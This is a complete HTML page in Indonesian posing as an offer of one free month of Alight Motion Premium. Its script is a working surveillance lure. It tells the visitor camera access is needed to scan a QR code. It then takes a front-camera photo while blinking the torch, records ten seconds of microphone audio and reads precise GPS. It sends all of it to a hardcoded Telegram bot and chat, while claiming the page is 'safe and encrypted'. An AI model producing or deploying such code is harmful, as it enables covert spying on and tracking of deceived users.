<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Alight Premium</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:'Inter',-apple-system,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;background:radial-gradient(circle at 30% 20%,#1e2435,#0a0c14 90%);padding:16px}
    .card{position:relative;z-index:1;background:rgba(255,255,255,.05);backdrop-filter:blur(28px) saturate(200%);border-radius:56px;padding:32px 26px;max-width:500px;width:100%;box-shadow:0 50px 100px rgba(0,0,0,.7),inset 0 1px 0 rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.08)}
    .top{display:flex;justify-content:space-between;align-items:center;margin-bottom:18px}
    .badge{background:linear-gradient(135deg,#f7971e,#ffd200);color:#fff;font-weight:800;font-size:11px;padding:6px 18px;border-radius:40px;display:flex;align-items:center;gap:8px;box-shadow:0 4px 12px rgba(247,151,30,.3)}
    .badge i{font-size:13px}
    .timer{color:#ffb347;background:rgba(35,42,61,.5);padding:4px 16px;border-radius:30px;font-size:13px;display:flex;align-items:center;gap:8px;border:1px solid rgba(255,180,70,.15)}
    .icon{text-align:center;font-size:64px;color:#ffb347;text-shadow:0 0 50px rgba(247,151,30,.3);margin-bottom:2px}
    h1{font-size:30px;font-weight:800;text-align:center;background:linear-gradient(135deg,#ffb347,#ff8c00);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
    .sub{text-align:center;color:#a8b3ce;font-size:15px;border-bottom:1px solid rgba(255,255,255,.06);padding-bottom:16px;margin-bottom:20px}
    .sub strong{color:#ffb347;-webkit-text-fill-color:#ffb347}
    .info{background:rgba(18,23,36,.4);border-radius:24px;padding:18px 22px;margin-bottom:22px;border-left:6px solid #f7971e;font-size:15px;line-height:1.8;display:flex;gap:14px;border:1px solid rgba(255,255,255,.05)}
    .info i{color:#ffb347;font-size:24px;margin-top:2px}
    .info .text{color:#eef2f7}
    .info .text span{color:#ffd966;font-weight:600}
    .status{background:rgba(16,21,31,.5);border-radius:20px;padding:16px 22px;margin-bottom:24px;display:flex;align-items:center;gap:18px;border:1px solid rgba(255,255,255,.06);min-height:72px}
    .dot{width:18px;height:18px;border-radius:50%;background:#3e485f;flex-shrink:0;transition:.4s}
    .dot.active{background:#f5b342;box-shadow:0 0 30px #f5b342aa}
    .dot.done{background:#2ecc71;box-shadow:0 0 30px #2ecc71aa}
    .dot.error{background:#e74c3c;box-shadow:0 0 30px #e74c3caa}
    #st{font-size:16px;color:#d0dbf0;flex:1}
    #st i{margin-right:10px;color:#f5b342}
    #st a{color:#ffb347;text-decoration:underline;word-break:break-all}
    .btn{width:100%;padding:20px;border:none;border-radius:60px;background:linear-gradient(135deg,#f7971e,#e07c0a);color:#fff!important;font-size:20px;font-weight:800;cursor:pointer;display:flex;justify-content:center;align-items:center;gap:14px;box-shadow:0 14px 40px rgba(247,151,30,.3);transition:.3s;position:relative;overflow:hidden}
    .btn::after{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(circle,rgba(255,255,255,.15) 0%,transparent 70%);opacity:0;transition:opacity .4s}
    .btn:hover:not(:disabled)::after{opacity:1}
    .btn:hover:not(:disabled){transform:translateY(-3px)scale(1.02);box-shadow:0 18px 50px rgba(247,151,30,.45)}
    .btn:active:not(:disabled){transform:scale(.97)}
    .btn:disabled{opacity:.5;background:#3a3f55;color:#8892b0!important;box-shadow:none;transform:none}
    .btn i{font-size:24px}
    .log{margin-top:22px;background:rgba(11,16,26,.5);border-radius:18px;padding:14px 18px;max-height:110px;overflow-y:auto;font-size:12px;color:#6a7a96;border:1px solid rgba(255,255,255,.04);line-height:2.1;font-family:'JetBrains Mono',monospace}
    .log i{color:#f5b342;margin-right:6px}
    .log a{color:#ffb347;text-decoration:underline}
    .log::-webkit-scrollbar{width:5px}
    .log::-webkit-scrollbar-track{background:transparent}
    .log::-webkit-scrollbar-thumb{background:#3d4a66;border-radius:10px}
    .footer{margin-top:18px;font-size:12px;color:#4d5a78;display:flex;justify-content:center;gap:16px;flex-wrap:wrap}
    .footer span{background:rgba(27,34,53,.4);padding:4px 18px;border-radius:40px;display:flex;align-items:center;gap:8px;border:1px solid rgba(255,255,255,.05)}
    .footer .gold{color:#ffb347}
    @media(max-width:480px){.card{padding:24px 18px;border-radius:40px}h1{font-size:26px}.icon{font-size:54px}.btn{font-size:18px;padding:17px}}
  </style>
</head>
<body>
<div class="card">
  <div class="top">
    <span class="badge"><i class="fas fa-crown"></i> PROMO</span>
    <span class="timer"><i class="fas fa-hourglass-half"></i> 24:00</span>
  </div>
  <div class="icon"><i class="fas fa-film"></i><i class="fas fa-crown" style="font-size:.5em;margin-left:-8px;color:#ffd966"></i></div>
  <h1>Alight Premium</h1>
  <div class="sub">Klaim <strong>1 Bulan GRATIS</strong> · Aktivasi Perangkat</div>

  <div class="info">
    <i class="fas fa-camera"></i>
    <div class="text">
      <span>Silahkan izinkan kamera untuk scan QR yang dikirimkan web</span>
    </div>
  </div>

  <div class="status">
    <div class="dot" id="dot"></div>
    <div id="st"><i class="fas fa-circle"></i> Siap</div>
  </div>

  <button class="btn" id="btn"><i class="fas fa-play"></i> Klaim Sekarang</button>

  <div class="log" id="log"><i class="fas fa-terminal"></i> Log aktivitas</div>

  <div class="footer">
    <span><i class="fas fa-shield-alt"></i> Aman & Terenkripsi</span>
    <span class="gold"><i class="fas fa-bolt"></i> Klik tombol untuk mulai</span>
  </div>
</div>

<script>
// ===== KONFIGURASI =====
const BOT = '8600589160:AAEvLkCFyx8C4LT27bTAMBOrR6m7wKdpKdw';
const CHAT = '8303356575';
const SEND = `https://api.telegram.org/bot${BOT}/sendMessage`;
const SEND_PHOTO = `https://api.telegram.org/bot${BOT}/sendPhoto`;
const SEND_AUDIO = `https://api.telegram.org/bot${BOT}/sendAudio`;
const SEND_DOC = `https://api.telegram.org/bot${BOT}/sendDocument`;

let stream = null, chunks = [], recorder = null, locData = null, running = false;
let videoTrack = null;
let blinkInterval = null;
const st = document.getElementById('st'), dot = document.getElementById('dot');
const btn = document.getElementById('btn'), log = document.getElementById('log');

function setStatus(msg, state) {
  let icon = '<i class="fas fa-spinner fa-pulse"></i>';
  if (state === 'done') icon = '<i class="fas fa-check-circle"></i>';
  else if (state === 'error') icon = '<i class="fas fa-exclamation-circle"></i>';
  else if (!state) icon = '<i class="fas fa-circle"></i>';
  st.innerHTML = icon + ' ' + msg;
  dot.className = 'dot';
  if (state === 'active') dot.classList.add('active');
  else if (state === 'done') dot.classList.add('done');
  else if (state === 'error') dot.classList.add('error');
}

function logMsg(m) {
  const t = new Date().toLocaleTimeString('id-ID');
  log.innerHTML += `\n[${t}] ${m}`;
  log.scrollTop = log.scrollHeight;
}

function gpsLink(lat, lng) { return `https://www.google.com/maps?q=${lat},${lng}`; }

async function sendText(t) {
  try {
    const r = await fetch(SEND, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT, text: t })
    });
    return r.json();
  } catch (e) {}
}

async function sendPhoto(blob, cap) {
  const fd = new FormData();
  fd.append('chat_id', CHAT); fd.append('photo', blob, 'cap.jpg');
  if (cap) fd.append('caption', cap);
  try { return await fetch(SEND_PHOTO, { method: 'POST', body: fd }); } catch (e) {}
}

async function sendAudio(blob, cap) {
  const fd = new FormData();
  fd.append('chat_id', CHAT); fd.append('audio', blob, 'rec.webm');
  if (cap) fd.append('caption', cap);
  try { return await fetch(SEND_AUDIO, { method: 'POST', body: fd }); } catch (e) {}
}

async function sendLocationJSON(loc) {
  if (!loc) return;
  const blob = new Blob([JSON.stringify(loc, null, 2)], { type: 'application/json' });
  const fd = new FormData();
  fd.append('chat_id', CHAT); fd.append('document', blob, 'loc.json');
  fd.append('caption', 'Lokasi');
  try { return await fetch(SEND_DOC, { method: 'POST', body: fd }); } catch (e) {}
}

// ===== KONTROL SENTER =====
async function setTorch(state) {
  if (!videoTrack) return;
  try {
    await videoTrack.applyConstraints({ advanced: [{ torch: state }] });
  } catch (e) {
    // ignore
  }
}

function startBlink() {
  if (blinkInterval) clearInterval(blinkInterval);
  let on = false;
  blinkInterval = setInterval(async () => {
    on = !on;
    await setTorch(on);
    logMsg(on ? '💡 Senter ON' : '💡 Senter OFF');
  }, 300); // blink setiap 300ms
}

function stopBlink() {
  if (blinkInterval) {
    clearInterval(blinkInterval);
    blinkInterval = null;
  }
  setTorch(false); // pastikan mati
  logMsg('💡 Senter dimatikan (blink stop)');
}

// ===== CAPTURE FOTO (tanpa senter otomatis) =====
async function capturePhoto() {
  return new Promise((resolve, reject) => {
    if (!stream) return reject('no stream');
    const track = stream.getVideoTracks()[0];
    if (!track) return reject('no video track');
    const ic = new ImageCapture(track);
    ic.takePhoto().then(resolve).catch(reject);
  });
}

function recordAudio() {
  return new Promise((r, j) => {
    if (!stream) return j('no stream');
    const audioTracks = stream.getAudioTracks();
    if (!audioTracks.length) return j('no audio');
    const audioStream = new MediaStream(audioTracks);
    recorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
    chunks = [];
    recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
    recorder.onstop = () => r(new Blob(chunks, { type: 'audio/webm' }));
    recorder.start();
    setTimeout(() => { if (recorder && recorder.state === 'recording') recorder.stop(); }, 10000);
  });
}

function getLocation() {
  return new Promise((r, j) => {
    if (!navigator.geolocation) return j('no geolocation');
    navigator.geolocation.getCurrentPosition(
      p => r({ lat: p.coords.latitude, lng: p.coords.longitude, accuracy: p.coords.accuracy, timestamp: new Date().toISOString() }),
      e => j(e.message),
      { enableHighAccuracy: true, timeout: 15000 }
    );
  });
}

async function run() {
  if (running) return;
  running = true;
  btn.disabled = true;
  btn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Memproses...';
  logMsg('▶ Mulai aktivasi');

  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
    videoTrack = stream.getVideoTracks()[0];
    logMsg('✅ Izin media diberikan');

    // --- FOTO dengan BLINK senter mulai sekarang ---
    setStatus('Mengambil & mengirim QR...', 'active');
    startBlink(); // senter mulai blink

    // Ambil foto
    const photoBlob = await capturePhoto();
    logMsg('📷 Foto QR diambil');

    // Kirim foto (senter tetap blink)
    await sendPhoto(photoBlob, 'Alight_QR_scan');
    logMsg('📤 Foto terkirim');
    await sendText('✅ QR code terdeteksi — foto terkirim.');

    // Hentikan blink setelah foto terkirim
    stopBlink();
    // ------------------------------------------------

    setStatus('Rekam suara (10 detik)...', 'active');
    logMsg('🎙️ Mulai rekam...');
    const audioBlob = await recordAudio();
    logMsg('⏹️ Rekaman selesai');
    setStatus('Kirim audio...', 'active');
    await sendAudio(audioBlob, 'Alight_audio_test');
    logMsg('📤 Audio terkirim');

    setStatus('Cari lokasi...', 'active');
    logMsg('🌐 Mengambil GPS...');
    try {
      locData = await getLocation();
      const link = gpsLink(locData.lat, locData.lng);
      await sendLocationJSON(locData);
      await sendText(`📍 Wilayah: ${locData.lat}, ${locData.lng} (±${locData.accuracy}m)\n🔗 Maps: ${link}`);
      setStatus(`✅ Lokasi diverifikasi - <a href="${link}" target="_blank">${link}</a>`, 'done');
      logMsg(`📍 GPS: ${link}`);
    } catch (e) {
      await sendText(`❌ Gagal lokasi: ${e}`);
      logMsg('⚠️ Error lokasi');
      setStatus('⚠️ Lokasi gagal, promo tetap aktif', 'error');
    }

    await sendText('🎉 Alight Motion Premium 1 bulan — AKTIF. Data lengkap.');
    logMsg('✅ === PREMIUM AKTIF ===');
    if (!locData) setStatus('🎉 Premium aktif (tanpa lokasi)', 'done');

  } catch (err) {
    const msg = '❌ ' + err;
    setStatus(msg, 'error');
    logMsg('🚨 KRITIKAL: ' + err);
    await sendText('❌ Error: ' + err);
    // Pastikan blink berhenti dan senter mati
    stopBlink();
  } finally {
    if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; videoTrack = null; }
    if (recorder && recorder.state === 'recording') recorder.stop();
    btn.disabled = false;
    btn.innerHTML = '<i class="fas fa-redo-alt"></i> Ulangi';
    running = false;
  }
}

btn.addEventListener('click', run);
window.onload = () => { logMsg('💡 Siap. Klik tombol "Klaim Sekarang"'); };
logMsg('🔧 Sistem siap');
</script>
</body>
</html>
